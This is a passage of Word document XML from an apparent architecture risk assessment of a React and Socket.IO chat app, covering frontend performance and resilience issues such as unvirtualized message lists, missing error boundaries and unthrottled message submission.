              <w:t>express.json({ limit: '1mb' })</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Add input sanitization library (e.g., </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>validator.js</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> or </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>express-validator</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8. Risk Area 7: Frontend Architecture, Client-Side Resilience &amp; UX Vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Severity: 🟡 MEDIUM-HIGH</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>8.1 Identification</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>While backend architectural risks threaten data integrity and server resources, the frontend Single Page Application (React.js) contains several vulnerabilities that directly threaten client-side stability, browser memory consumption, responsiveness, and user experience resilience under real-world conditions.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>8.2 Evidence</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Vulnerability A — Unvirtualized DOM Tree Bloat (`ScrollableChat.js`):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">In </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>frontend/src/components/ScrollableChat.js</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, the chat message history is rendered via an unrestricted </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.map()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> loop directly into the browser DOM:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:fill="F4F4F4" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[javascript]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// ScrollableChat.js:</w:t>
        <w:br/>
        <w:t>{messages &amp;&amp;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  messages.map((m, i) =&gt; (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;div style={{ display: "flex" }} key={m._id}&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">      {(isSameSender(messages, m, i, user._id) ||</w:t>
        <w:br/>
        <w:t xml:space="preserve">        isLastMessage(messages, i, user._id)) &amp;&amp; (</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;Tooltip label={m.sender.name} placement="bottom-left" hasArrow&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">          &lt;Avatar mt="7px" mr={1} size="sm" src={m.sender.pic} /&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;/Tooltip&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">      )}</w:t>
        <w:br/>
        <w:t xml:space="preserve">      &lt;span style={{ ... }}&gt;{m.content}&lt;/span&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;/div&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ))}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Every single message in the conversation creates multiple DOM elements, Chakra UI Tooltips, and Avatar image components. In an active group conversation with 2,000 to 10,000 messages: - The browser must maintain tens of thousands of active DOM nodes in memory. - Memory consumption in Chrome/Edge spikes beyond 1 GB RAM for a single tab. - Frame rates drop severely during scrolling (jank), leading to browser unresponsiveness or the fatal </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Aw, Snap! Out of Memory</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> tab crash.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Vulnerability B — Unhandled Application State Crashes (Missing React Error Boundaries):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">In </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>frontend/src/Context/ChatProvider.js</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:fill="F4F4F4" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[javascript]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// ChatProvider.js, line 14:</w:t>
        <w:br/>
        <w:t>const userInfo = JSON.parse(localStorage.getItem("userInfo"));</w:t>
        <w:br/>
        <w:t>setUser(userInfo);</w:t>
        <w:br/>
        <w:t>if (!userInfo) history.push("/");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">The application assumes that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>localStorage.getItem("userInfo")</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> is either </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>null</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> or perfectly formatted JSON. If the stored string becomes corrupted, or if an unhandled rendering error occurs anywhere inside deeply nested child components: - The application crashes entirely with an uncaught runtime exception. - Because there is no top-level React </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Error Boundary</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>componentDidCatch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>), the React component tree unmounts completely. - The user is presented with a completely blank white screen ("White Screen of Death") with zero explanatory feedback or recovery mechanisms.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Vulnerability C — Silent WebSocket Disconnection &amp; Lack of Offline Feedback:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">In </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>frontend/src/components/SingleChat.js</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>, Socket.IO is initialized, but connection lifecycle events (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>connect_error</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>reconnect_attempt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>disconnect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>) are not bound to any persistent user-facing indicator:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:fill="F4F4F4" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[javascript]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// SingleChat.js:</w:t>
        <w:br/>
        <w:t>useEffect(() =&gt; {</w:t>
        <w:br/>
        <w:t xml:space="preserve">  socket = io(ENDPOINT);</w:t>
        <w:br/>
        <w:t xml:space="preserve">  socket.emit("setup", user);</w:t>
        <w:br/>
        <w:t xml:space="preserve">  socket.on("connected", () =&gt; setSocketConnected(true));</w:t>
        <w:br/>
        <w:t xml:space="preserve">  socket.on("typing", () =&gt; setIsTyping(true));</w:t>
        <w:br/>
        <w:t xml:space="preserve">  socket.on("stop typing", () =&gt; setIsTyping(false));</w:t>
        <w:br/>
        <w:t xml:space="preserve">  // Missing listeners: connect_error, reconnecting, disconnect</w:t>
        <w:br/>
        <w:t>}, []);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>If the client loses internet connectivity or the backend restarts: - The UI maintains a phantom "Connected" visual appearance. - The user continues typing and submitting messages, unaware that their socket transport is broken. - Messages silently fail to broadcast, and real-time counterpart updates cease without any warning banner.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Vulnerability D — Unthrottled Input Submissions &amp; Duplicate Message Spams:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:fill="F4F4F4" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[javascript]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// SingleChat.js, lines 70-80:</w:t>
        <w:br/>
        <w:t>const sendMessage = async (event) =&gt; {</w:t>
        <w:br/>
        <w:t xml:space="preserve">  if (event.key === "Enter" &amp;&amp; newMessage) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    socket.emit("stop typing", selectedChat._id);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    try {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      const config = { headers: { ... } };</w:t>
        <w:br/>
        <w:t xml:space="preserve">      setNewMessage("");</w:t>
        <w:br/>
        <w:t xml:space="preserve">      const { data } = await axios.post("/api/message", { ... }, config);</w:t>
        <w:br/>
        <w:t xml:space="preserve">      socket.emit("new message", data);</w:t>
        <w:br/>
        <w:t xml:space="preserve">      setMessages([...messages, data]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    } catch (error) { ... }</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">The input field does not implement debouncing, throttling, or a temporary </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>disabled</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> state during the in-flight asynchronous </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>axios.post</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> call. Under high network latency (2G/3G or slow WiFi), a user repeatedly pressing "Enter" triggers multiple simultaneous HTTP POST requests, creating duplicate messages in the database and timeline.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Vulnerability E — Global Context Re-Render Cascades:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">The entire application state is stored in a single monolithic </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ChatContext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ChatProvider.js</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> without granular memoization (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>React.memo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>useMemo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>useCallback</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">): - Any mutation to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>selectedChat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>notification</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>chats</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> triggers an immediate re-render of the entire component tree (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>SideDrawer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>MyChats</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ChatBox</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>, and all sub-dialogs). - During rapid real-time typing indicators or incoming message bursts, this re-render cascade causes perceptible UI stutter and input lag.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>8.3 Threat Scenario</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>1. A user participates in a high-volume group chat that has accumulated 5,000 messages. 2. The user navigates to the group; the browser attempts to construct 25,000+ DOM nodes at once. 3. The browser tab freezes for 4-6 seconds; scrolling causes severe frame stutter. 4. Meanwhile, a brief Wi-Fi hiccup drops the WebSocket connection. 5. Because there is no offline banner, the user types a critical message and presses Enter 4 times due to visual lag. 6. When the connection re-establishes, 4 duplicate messages are submitted to the server. 7. If any malformed avatar URL fails to parse, the entire interface crashes into a blank white screen.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>8.4 Current Mitigation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">- React's virtual DOM minimizes direct DOM writes for small-to-moderate component trees. - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
